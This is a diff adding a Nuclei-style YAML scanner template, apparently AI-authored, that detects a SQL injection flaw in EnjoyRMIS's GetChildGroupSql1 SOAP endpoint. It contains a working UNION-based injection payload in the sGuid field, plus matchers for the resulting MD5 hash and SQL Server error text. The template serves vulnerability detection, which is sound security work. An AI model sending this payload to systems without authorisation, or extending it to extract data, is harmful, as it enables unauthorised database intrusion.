@@ -1,0 +1,48 @@
+id: poc-yaml-enjoyrmis-getchildgroupsql1-sqli
+info:
+  name: EnjoyRMIS GetChildGroupSql1 SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the EnjoyRMIS GetChildGroupSql1 SOAP API endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetChildGroupSql1"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetChildGroupSql1 xmlns="http://tempuri.org/">
+              <sGuid>1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))),NULL,NULL-- jhpF</sGuid>
+            </GetChildGroupSql1>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "soap:Server"
+          - "在将"
+          - "转换成数据类型"
+        part: body
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: status
+        status:
+          - 500
